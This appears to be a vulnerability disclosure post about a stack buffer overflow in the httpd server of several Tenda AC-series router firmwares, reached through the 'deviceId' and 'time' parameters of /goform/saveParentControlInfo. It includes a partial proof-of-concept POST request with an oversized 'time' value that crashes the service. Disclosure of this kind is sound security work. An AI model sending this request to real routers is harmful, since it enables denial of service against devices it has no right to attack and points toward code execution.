---
layout: post
title: "Tenda Vulnerability 5"
date: 2020-04-28 9:53:05 +0800
comments: true
categories: vulnerability
---

<font size="4">**Vendor of the products:**　　**Tenda** </font>

<font size="4"> **Reported by:** 　　　　　 **Joel**  </font>

<font size="4"> **Affected products:** </font>　

```
    AC9 V1.0 V15.03.05.19(6318)_CN
    AC9 V3.0 V15.03.06.42_multi
    AC15 V1.0 V15.03.05.19_multi_TD01
    AC18 V15.03.05.19(6318_)_CN
    AC6 V1.0 V15.03.05.19_multi_TD01
```




## Overview

An issue was discovered on Tenda AC6 V1.0 V15.03.05.19_multi_TD01, AC9 V1.0 V15.03.05.19(6318), AC9 V3.0 V15.03.06.42_multi, AC15 V1.0 V15.03.05.19_multi_TD01, AC18  V15.03.05.19(6318) devices. There is a buffer overflow vulnerability in the router's web server -- httpd. While processing the `deviceId` and `time` parameters for a post request, the value is directly used in a `strcpy` to a local variable placed on the stack, which overrides the return address of the function. The attackers can construct a payload to carry out arbitrary code attacks.




## POC

**This PoC can result in a Dos.**

**Given the vendor's security, we only provide parts of the HTTP.**

```
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.18.131
Accept:  */*
X-Requested-With:  XMLHttpRequest
User-Agent:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding:  gzip, deflate
Accept-Language:  en-US,en;q=0.9
Connection: close
Content-Type: text/plain
Cookie: password=pyl5gk

deviceId=&time=1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

## Details

### ARM

![](/images/tenda-5/arm-1.png)

![](/images/tenda-5/arm-2.png)

### MIPS

![](/images/tenda-5/mips-1.png)

![](/images/tenda-5/mips-2.png)

![](/images/tenda-5/mips-3.png)

